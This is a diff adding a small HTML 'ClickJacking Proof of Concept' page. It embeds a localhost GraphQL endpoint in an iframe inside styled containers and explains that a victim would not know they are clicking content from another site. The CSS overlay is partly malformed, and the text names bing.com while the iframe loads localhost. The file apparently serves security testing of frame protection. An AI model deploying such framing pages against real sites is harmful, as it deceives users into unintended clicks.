@@ -1,0 +1,93 @@
+<html>
+<head>
+<title>ClickJacking POC</title>
+</head>
+<body>
+<style>
+#header {
+    width: 800px;
+    background-color: white;
+    height: 5px;
+	float: center;
+}
+
+#container {
+    width: 902px;
+    background-color: white;
+    margin: auto;
+	
+}
+#first {
+    width: 400px;
+    float: left;
+    height:500px;
+	padding:5px;
+    background-color: white;
+	border: 3px solid grey;
+	text-align: left;
+}
+#second {
+    width: 400px;
+    float: left;
+    height: 500px;
+    background-color: white;
+	padding:5px;
+    background-color: white;
+	border: 3px solid grey;
+	text-align: left;
+}
+#clear {
+    clear: both;
+}
+
+#parent {
+  width: 600px;
+  height: 500px;
+  border:solid 1px #000;
+}
+iframe {
+  width:100%;
+  height:100%;
+  border:0px;
+}
+
+#parent > front {
+  opacity: 0.3;
+  position:relative;
+  left: right;
+  left:10px;
+  height: 130px;
+  bottom:325px;
+  transition: 0.5s;
+}
+
+#parent > button {
+  opacity: 1;
+}  
+  
+</style>
+
+
+<div id="header">
+
+
+</div>
+<div id="container">
+<h3>This is a ClickJacking Proof of Concept</h3></br>
+<b>Click Jacking POC </b>- As a victim you do not know you are clicking on content from another website</br>
+You would be inclined to beleive that you were actually interacting with the content of the larger iframe, in this example "bing.com"</br>
+
+	<div id="parent">
+	  <div id="front" >
+				<iframe id="jello" src="http://localhost:4000/graphql"  scrolling="yes" >
+		</iframe>
+		</div>
+
+		</div>
+		</div>
+	</div>
+
+
+
+</html>
+ <!--https://i-08bf610db7a291c74.ec2.splunkit.io-->
